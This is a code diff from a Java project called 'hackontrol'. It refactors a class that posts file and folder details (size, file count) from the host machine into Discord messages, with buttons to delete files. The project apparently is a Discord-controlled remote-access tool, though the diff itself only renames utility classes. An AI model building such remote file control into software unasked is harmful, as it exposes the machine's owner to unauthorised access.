@@ -14,8 +14,9 @@ import javax.swing.filechooser.FileSystemView;
 
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.utils.FileUtils;
-import com.khopan.hackontrol.utils.FileUtils.FileCountAndSize;
+import com.khopan.hackontrol.utils.HackontrolButton;
+import com.khopan.hackontrol.utils.HackontrolFile;
+import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
 import com.khopan.hackontrol.utils.ImageUtils;
 
 import net.dv8tion.jda.api.EmbedBuilder;
@@ -70,7 +71,7 @@ public class FileEmbedSender implements Runnable {
 			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete File", this.deleteHandler :: accept));
 		}
 
-		buttonList.add(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete"));
+		buttonList.add(HackontrolButton.delete());
 		messageBuilder.addActionRow(buttonList);
 		this.action.accept(messageBuilder.build());
 	}
@@ -95,14 +96,14 @@ public class FileEmbedSender implements Runnable {
 		long size;
 
 		if(this.root.isDirectory()) {
-			FileCountAndSize countAndSize = FileUtils.getFileCountAndSize(root);
+			FileCountAndSize countAndSize = HackontrolFile.getFileCountAndSize(root);
 			size = countAndSize.folderSize;
 			this.field(builder, "File Count", String.valueOf(countAndSize.fileCount));
 		} else {
 			size = this.root.length();
 		}
 
-		this.field(builder, "Size", FileUtils.getFileSizeDisplay(size));
+		this.field(builder, "Size", HackontrolFile.getFileSizeDisplay(size));
 	}
 
 	private BasicFileAttributes getFileAttributes(File file) {
